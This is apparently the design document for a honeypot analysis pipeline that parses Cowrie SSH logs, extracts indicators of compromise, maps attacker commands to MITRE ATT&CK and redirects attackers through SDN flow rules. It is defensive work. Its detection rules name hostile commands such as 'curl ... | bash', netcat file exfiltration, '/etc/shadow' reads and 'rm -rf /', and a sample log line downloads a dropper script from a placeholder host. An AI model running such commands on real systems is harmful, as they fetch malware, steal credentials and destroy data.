# ARIA Phase 2 – Attack Analysis & Intelligence Collection

## Overview

ARIA (Adaptive Reasoning Intelligence for Attack Deception) Phase 2 implements an end-to-end telemetry ingestion, attack session reconstruction, indicator of compromise (IOC) extraction, MITRE ATT&CK intent classification, and SDN network-level intelligence pipeline.

---

## 1. End-to-End Pipeline Architecture

```
Raw Cowrie Log (JSON Lines)
          │
          ▼
    Cowrie Parser (honeypot/parser.py)
          │
          ▼
   Session Builder (honeypot/session_builder.py)
          │
    ┌─────┴─────────────────────────┐
    ▼                               ▼
Command Stream              File Downloads
    │                               │
    ├───────────────┬───────────────┤
    ▼               ▼               ▼
IOC Extraction   Intent Class.   Session Meta
(IPv4, URL,      (MITRE ATT&CK   (Timestamps,
 Domain, Hash,    Tactics &       Auth Status,
 File Paths)      Techniques)     Durations)
    │               │               │
    └───────────────┼───────────────┘
                    ▼
     MongoDB Repositories Layer
     (database/repositories/)
     ├── sessions
     ├── logs
     ├── iocs
     ├── intents
     └── sdn_events
                    ▲
                    │  (Network Telemetry)
             SDN Ryu Controller
             (OpenFlow 1.3 / Mininet)
                    │
                    ▼
          FastAPI Backend Service
          (backend/app/main.py)
          └── REST API & Ingestion
```

---

## 2. Shared Data Contracts

All components strictly adhere to canonical Pydantic models defined in `backend/app/schemas/`:

* **`CowrieEvent`**: Raw and normalized honeypot log record (`eventid`, `timestamp`, `session`, `src_ip`, `src_port`, `dst_ip`, `dst_port`, `input`, `username`, `password`, `shasum`, `outfile`, `raw`).
* **`Command`**: Single command executed in a session (`command`, `timestamp`, `session_id`).
* **`Session`**: Aggregated attack session entity (`session_id`, `attacker_ip`, `start_time`, `end_time`, `duration`, `username`, `authentication_status`, `commands`, `iocs`, `intents`, `downloaded_files`, `is_closed`).
* **`IOC`**: Observable indicator of compromise (`type`, `value`, `session_id`, `source`, `timestamp`, `is_internal`, `metadata`).
* **`Intent`**: Attacker tactical classification (`intent`, `confidence`, `matched_command`, `rule`, `session_id`, `mitre_technique`, `mitre_id`, `timestamp`).
* **`SDNEvent`**: Switch-level network event (`attacker_ip`, `destination_ip`, `source_port`, `destination_port`, `protocol`, `switch_id`, `timestamp`, `ssh_detected`, `redirected`).

---

## 3. Supported IOC Types

* `ipv4`: Extracted from commands and URLs. RFC1918/loopback ranges are flagged `is_internal=True`.
* `domain`: Extracted from command strings and downloaded URLs (e.g. `badc2.org`, `c2-botnet.xyz`).
* `url`: Complete HTTP/HTTPS request strings (e.g. `http://198.51.100.55/payloads/dropper.sh`).
* `md5`: 32-character hexadecimal hashes.
* `sha1`: 40-character hexadecimal hashes.
* `sha256`: 64-character hexadecimal hashes (e.g. from Cowrie `shasum` field).
* `file_path`: Unix file paths observed in command targets or destination files (`/tmp/...`, `/etc/...`, etc.).

*Note:* Extraction indicates an **observed indicator** within an attack session, not guaranteed maliciousness.

---

## 4. Supported Intent Tactics & MITRE ATT&CK Alignment

Deterministic rule-based intent classification is executed locally without requiring an external LLM:

1. **Reconnaissance / Discovery**:
   * `T1082`: System Information Discovery (`uname`, `hostname`, `uptime`, `lscpu`, `/etc/os-release`)
   * `T1033`: System Owner/User Discovery (`whoami`, `id`)
   * `T1016`: System Network Configuration Discovery (`ifconfig`, `ip addr`, `ip route`)
   * `T1049`: System Network Connections Discovery (`netstat`, `ss`, `lsof`, `arp`)
   * `T1057`: Process Discovery (`ps aux`, `top`, `pstree`)
2. **Credential Access**:
   * `T1003.008`: OS Credential Dumping (`/etc/shadow`)
   * `T1087.001`: Local Account Discovery (`/etc/passwd`)
   * `T1552.001`: Credentials in Files (`grep -i password`)
   * `T1110`: Brute Force Tools (`john`, `hashcat`, `hydra`, `unshadow`)
3. **Privilege Escalation**:
   * `T1548.003`: Sudo & Sudo Caching (`sudo`, `su -`, `pkexec`, `doas`)
   * `T1548.001`: Setuid & Setgid (`chmod +s`, `chmod 4755`)
   * `T1136.001`: Local Account Creation (`useradd`, `usermod`, `groupadd`)
4. **Persistence**:
   * `T1053.003`: Scheduled Task / Cron (`crontab`, `/var/spool/cron/`, `/etc/cron.*`)
   * `T1543.002`: Systemd Service Persistence (`systemctl enable`)
   * `T1098.004`: SSH Authorized Keys Injection (`authorized_keys`)
5. **Execution**:
   * `T1105`: Ingress Tool Transfer (`wget`, `curl`)
   * `T1059.004`: Unix Shell Pipe Execution (`curl ... | bash`, `wget ... | sh`, `chmod +x ... && ./...`)
   * `T1059`: Script Interpreters (`python -c`, `perl -e`)
6. **Defense Evasion**:
   * `T1070.003`: Clear Command History (`history -c`, `rm -rf ~/.bash_history`, `unset HISTFILE`)
   * `T1222.002`: File Permissions Modification (`chmod +x`, `chmod 777`)
   * `T1562.004`: Disable Firewall (`iptables -F`)
7. **Lateral Movement**:
   * `T1021.004`: SSH Lateral Access (`ssh user@host`)
   * `T1570`: Lateral Tool Transfer (`scp`, `rsync`)
8. **Data Exfiltration**:
   * `T1048.003`: Exfiltration Over HTTP/S (`curl -d @file`, `curl -F`)
   * `T1048`: Exfiltration Over Netcat (`nc ... < file`)
9. **Destruction / Tampering**:
   * `T1485`: Data Destruction (`rm -rf /`)
   * `T1529`: System Shutdown / Reboot (`shutdown`, `reboot`, `init 0`)

---

## 5. Sample Payloads

### Sample Cowrie Event
```json
{
  "eventid": "cowrie.command.input",
  "timestamp": "2026-09-06T00:10:28.700000Z",
  "session": "s_aria_001",
  "src_ip": "203.0.113.15",
  "input": "wget http://198.51.100.55/payloads/dropper.sh -O /tmp/dropper.sh"
}
```

### Sample Session Document
```json
{
  "session_id": "s_aria_001",
  "attacker_ip": "203.0.113.15",
  "attacker_port": 49152,
  "destination_ip": "10.0.0.50",
  "destination_port": 2222,
  "start_time": "2026-09-06T00:10:00.100000Z",
  "end_time": "2026-09-06T00:10:50.000000Z",
  "duration": 50.0,
  "username": "root",
  "authentication_status": "success",
  "commands": [
    {
      "command": "uname -a",
      "timestamp": "2026-09-06T00:10:15.400000Z",
      "session_id": "s_aria_001"
    }
  ],
  "is_closed": true
}
```

### Sample Extracted IOC
```json
{
  "type": "ipv4",
  "value": "198.51.100.55",
  "session_id": "s_aria_001",
  "source": "command",
  "timestamp": "2026-09-06T00:10:28.700000Z",
  "is_internal": false,
  "metadata": {"source_context": "url_host"}
}
```

### Sample Classified Intent
```json
{
  "intent": "Reconnaissance / Discovery",
  "confidence": 0.9,
  "matched_command": "uname -a",
  "rule": "recon_sys_info_uname",
  "session_id": "s_aria_001",
  "mitre_technique": "System Information Discovery",
  "mitre_id": "T1082",
  "timestamp": "2026-09-06T00:10:15.400000Z"
}
```

---

## 6. SDN Telemetry & Redirection Subsystem

### OpenFlow 1.3 Redirection Logic
When an external attacker targets the protected server (`10.0.0.10:22`) and reaches the threshold of connection attempts (`SUSPICIOUS_THRESHOLD = 5`), the SDN controller installs 2 bidirectional OpenFlow 1.3 flow rules:

1. **Forward Rule (Attacker -> Server redirected to Honeypot)**:
   * Match: `eth_type=0x0800, ip_proto=6, ipv4_src=attacker_ip, ipv4_dst=10.0.0.10, tcp_dst=22`
   * Actions: `SetField(ipv4_dst=10.0.0.50), SetField(eth_dst=00:00:00:00:00:03), Output(port=3)`
2. **Reverse Rule (Honeypot -> Attacker rewritten as Server)**:
   * Match: `eth_type=0x0800, ip_proto=6, ipv4_src=10.0.0.50, ipv4_dst=attacker_ip, tcp_src=22`
   * Actions: `SetField(ipv4_src=10.0.0.10), SetField(eth_src=00:00:00:00:00:02), Output(port=1)`
